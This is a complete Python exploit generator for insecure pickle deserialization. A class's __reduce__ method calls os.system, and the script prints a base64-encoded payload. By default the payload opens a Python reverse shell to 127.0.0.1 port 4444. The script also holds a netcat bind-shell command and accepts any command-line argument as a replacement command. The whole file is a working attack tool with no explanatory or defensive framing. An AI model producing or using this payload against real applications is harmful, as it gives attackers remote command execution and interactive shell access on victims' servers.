import pickle
import sys
import base64

COMMAND = "netcat -c '/bin/bash -i' -l -p 4444"
PYTHON_COMMAND = '''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' '''
CUSTOM_COMMAND = sys.argv[1] if len(sys.argv) > 1 else PYTHON_COMMAND

class RCE(object):
    def __reduce__(self):
        import os
        return(os.system, (CUSTOM_COMMAND,))

print(base64.b64encode(pickle.dumps(RCE())))
